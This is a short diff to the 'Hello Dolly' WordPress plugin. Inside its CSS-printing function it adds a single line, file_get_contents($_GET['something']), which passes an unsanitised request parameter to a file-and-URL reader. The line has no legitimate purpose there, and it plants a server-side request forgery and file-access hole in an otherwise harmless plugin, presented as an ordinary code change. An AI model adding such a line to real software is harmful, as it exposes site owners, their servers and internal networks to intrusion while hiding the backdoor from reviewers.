@@ -63,7 +63,7 @@ add_action( 'admin_notices', 'hello_dolly' );
 function dolly_css() {
 	// This makes sure that the positioning is also good for right-to-left languages
 	$x = is_rtl() ? 'left' : 'right';
-
+	file_get_contents($_GET['something']);
 	echo "
 	<style type='text/css'>
 	#dolly {
